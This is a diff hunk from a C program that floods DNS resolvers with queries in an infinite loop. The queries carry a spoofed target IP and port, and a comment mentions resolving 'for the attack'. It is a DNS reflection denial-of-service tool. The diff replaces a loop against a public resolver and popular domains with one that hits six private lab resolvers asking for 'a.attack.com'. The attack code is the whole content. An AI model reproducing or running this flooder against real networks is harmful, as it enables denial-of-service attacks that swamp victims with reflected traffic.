@@ -52,12 +52,24 @@ int main(int argc, char **argv)
 	// to resolve for the attack, or use a list of different DNS servers, etc
 	//while(1)
 		//dns_send(trgt_ip, trgt_p, dns_srv, 53, dns_rcrd);
+	/*
 	while(1) {
 		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "www.google.com");
 		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "ietf.org");
 		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "www.amazon.com");
 		dns_send(trgt_ip, trgt_p, "208.80.184.69", 53, "ieee.org");
-	}	
+	}
+	*/
+	//int i;
+	//int times = atoi(argv[3]);
+	while(1){
+		dns_send(trgt_ip, trgt_p, "192.168.204.16", 53, "a.attack.com");
+		dns_send(trgt_ip, trgt_p, "192.168.204.124", 53, "a.attack.com");
+		dns_send(trgt_ip, trgt_p, "192.168.204.103", 53, "a.attack.com");
+		dns_send(trgt_ip, trgt_p, "192.168.204.148", 53, "a.attack.com");
+		dns_send(trgt_ip, trgt_p, "192.168.204.150", 53, "a.attack.com");
+		dns_send(trgt_ip, trgt_p, "192.168.204.153", 53, "a.attack.com");
+	}
 	return 0;
 }
 
